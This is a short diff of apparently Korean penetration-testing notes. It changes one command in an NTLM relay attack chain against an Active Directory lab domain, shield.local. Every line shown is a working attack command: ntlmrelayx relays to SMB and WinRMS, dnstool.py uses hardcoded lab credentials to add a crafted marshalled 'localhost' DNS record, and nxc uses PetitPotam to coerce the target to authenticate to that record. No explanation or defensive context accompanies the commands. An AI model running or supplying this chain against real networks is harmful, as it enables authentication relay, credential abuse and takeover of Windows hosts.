@@ -1088,7 +1088,7 @@ impacket-ntlmrelayx -t wkstn-3.shield.local -smb2support
 impacket-ntlmrelayx -t winrms://wkstn-3.shield.local -smb2support
 
 # localhost DNS 생성
-python3 dnstool.py -u 'shield.local\scarter' -p 'Passw0rd' dc4.shield.local -a add -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -d '192.168.115.178' -dns-ip 192.168.115.180
+python3 dnstool.py -u 'shield.local\scarter' -p 'Passw0rd' dc4.shield.local -a add -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -d <local IP> -dns-ip <Remote DNS IP> --tcp
 
 # 인증 시도
 nxc smb 192.168.115.185 -u scarter -p Passw0rd -M coerce_plus -o METHOD=PetitPotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
